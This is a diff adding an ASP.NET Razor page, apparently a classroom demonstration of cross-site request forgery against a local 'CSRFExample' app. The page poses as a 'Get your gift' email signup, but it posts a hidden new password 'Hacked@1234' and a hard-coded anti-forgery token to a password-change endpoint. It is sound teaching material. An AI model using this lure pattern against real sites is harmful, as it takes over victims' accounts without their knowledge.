@@ -1,0 +1,25 @@
+﻿@{
+    ViewData["Title"] = "Get your gift";
+}
+
+<h1>Get your gift</h1>
+
+<p>Enter your email address to get your gift</p>
+
+<div class="row">
+    <div class="col-md-4">
+        <form action="https://localhost:7161/CSRFExample/UpdatePassword" method="post">
+
+            <label> Email id :</label> <input type="email" name="emailId" class="form-control" />
+
+
+            <br />
+             <input type="hidden" name="newPassword" value="Hacked@1234" class="form-control" />
+            <input name="__RequestVerificationToken" type="hidden" value="CfDJ8MukhHRukCJFs0K5CLREhHThPcEzyooE2daoaotLHNb-iA2hDOMwF4IeKl1EHMh2zg9NXFMyv4HZZEpeOKujnD3prMHAb_z0MK59yBFwER3H3wcxQ72x2bFyw1jakp0P6OLddrSR9NOXCi8HEFpRLTo">
+
+            <br />
+            <button type="submit" class="btn btn-primary">Get Your Gift</button>
+
+        </form>
+    </div>
+</div>
